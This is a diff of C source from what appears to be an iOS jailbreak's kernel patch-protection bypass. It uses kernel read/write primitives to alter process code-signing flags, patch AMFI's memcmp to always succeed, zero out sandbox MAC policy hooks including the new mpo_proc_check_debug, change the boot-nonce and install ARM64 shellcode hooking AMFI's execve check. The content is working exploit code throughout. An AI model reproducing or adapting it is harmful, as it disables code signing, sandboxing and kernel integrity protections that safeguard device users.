@@ -52,17 +52,20 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
         char pname[40] = {0};
         kread(proc + offset_p_comm, pname, 20);
         
-        if (strstr(pname, "containermanager")) {
-            printf("[INFO]: found containermanagerd, giving it kern creds \n");
-            WriteAnywhere64(proc + offset_p_cred, kern_cred);
+//        if (strstr(pname, "containermanager")) {
+//            printf("[INFO]: found containermanagerd, giving it kern creds \n");
+//            WriteAnywhere64(proc + offset_p_cred, kern_cred);
+//        }
+        
+        if (pid > 0) {
+            uint32_t csflags = ReadAnywhere32(proc + offset_p_csflags);
+//            csflags |= CS_VALID|CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+//            csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
+            csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
+            csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
+            WriteAnywhere32(proc + offset_p_csflags, csflags);
+            printf("[INFO]: entitled proc: (%d) %s \n", pid, pname);
         }
-        
-        uint32_t csflags = ReadAnywhere32(proc + offset_p_csflags);
-        csflags |= CS_VALID|CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
-        csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
-        WriteAnywhere32(proc + offset_p_csflags, csflags);
-        
-        printf("[INFO]: entitled proc: (%d) %s \n", pid, pname);
         
         proc = ReadAnywhere64(proc);
     }
@@ -238,17 +241,17 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     {
         int n = 0;
         
-        //WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
-        //WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str    w8, [x23]
-        //WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov    x0, xzr
-        //WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
-        //WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
-        //WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
-        //WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
-        //WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
-        //WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80 (0x50)
-        //WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
-        //WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
+//        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr    w8, 0x28
+//        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str    w8, [x23]
+//        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov    x0, xzr
+//        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub    sp, x29, #64
+//        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp    x29, x30, [sp, #64]
+//        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp    x20, x19, [sp, #48]
+//        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp    x22, x21, [sp, #32]
+//        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp    x24, x23, [sp, #16]
+//        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80 (0x50)
+//        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
+//        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
         
         // test (10.3.2)
         WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr      w8, 0x28
@@ -379,20 +382,22 @@ remappage[remapcnt++] = (x & (~PMK));\
     
 #pragma mark - LwVM
     
-    uint64_t lwvm_write = find_lwvm_mapio_patch();
-    printf("[INFO]: lwvm_write = %llx \n", lwvm_write);
-    uint64_t lwvm_value = find_lwvm_mapio_newj();
-    printf("[INFO]: lwvm_value = %llx \n", lwvm_value);
-    RemapPage(lwvm_write);
-    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
+//    uint64_t lwvm_write = find_lwvm_mapio_patch();
+//    printf("[INFO]: lwvm_write = %llx \n", lwvm_write);
+//    uint64_t lwvm_value = find_lwvm_mapio_newj();
+//    printf("[INFO]: lwvm_value = %llx \n", lwvm_value);
+//    RemapPage(lwvm_write);
+//    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
     
     
 #pragma mark - MarijuanARM
     
     uint64_t kernvers = find_str("Darwin Kernel Version");
     uint64_t release = find_str("RELEASE_ARM");
+    
     RemapPage(kernvers-4);
     WriteAnywhere32(NewPointer(kernvers-4), 1);
+    
     RemapPage(release);
     if (NewPointer(release) == (NewPointer(release+11) - 11)) {
         // smoke trees
@@ -404,9 +409,9 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     uint64_t sysbootnonce = find_sysbootnonce();
     printf("[INFO]: found com.apple.System.boot-nonce at: 0%llx\n", sysbootnonce);
-    printf("val = %d", ReadAnywhere32(sysbootnonce));
+    printf("val = %d \n", ReadAnywhere32(sysbootnonce));
     WriteAnywhere32(sysbootnonce, 1);
-    printf("new val = %d", ReadAnywhere32(sysbootnonce));
+    printf("new val = %d \n", ReadAnywhere32(sysbootnonce));
     
     
 #pragma mark - patch: AMFI memcmp
@@ -415,7 +420,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     printf("[INFO]: memcmp_got at %llx\n", memcmp_got);
     
     uint64_t ret1 = find_ret_0();
-    printf("[INFO]: ret1 at %llx\n", ret1);
+    printf("[INFO]: ret at %llx\n", ret1);
 	
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
@@ -490,7 +495,6 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
-        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
@@ -514,9 +518,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
-        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
-        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
         
@@ -525,6 +527,8 @@ remappage[remapcnt++] = (x & (~PMK));\
         // test: from h3lix
         //WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)), 0);
         //WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property)), 0);
+        
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_debug)), 0);
     }
     
     
@@ -537,20 +541,6 @@ remappage[remapcnt++] = (x & (~PMK));\
         RemapPage(off);
         WriteAnywhere32(NewPointer(off), INSN_NOP);
     }
-    
-    
-#pragma mark - patch: tests
-    
-    {
-        //cs_enforcement_disable_amfi
-    }
-    
-//    {
-//        //AMFI: hook..execve()
-//        uint64_t off = 0xfffffff0064502a0 + slide;
-//        RemapPage(off);
-//        WriteAnywhere32(NewPointer(off), INSN_NOP);
-//    }
     
     
 #pragma mark - patch: AMFI: hook..execve()
@@ -567,7 +557,6 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere32(remap, 0x58000041);     // ldr x1, #8
         WriteAnywhere32(remap + 4, 0xd61f0020); // br x1
         WriteAnywhere64(remap + 8, shc + 0x200); /* amfi shellcode */
-        printf("[INFO]: wrote branch to shc+0x200");
     }
     
     
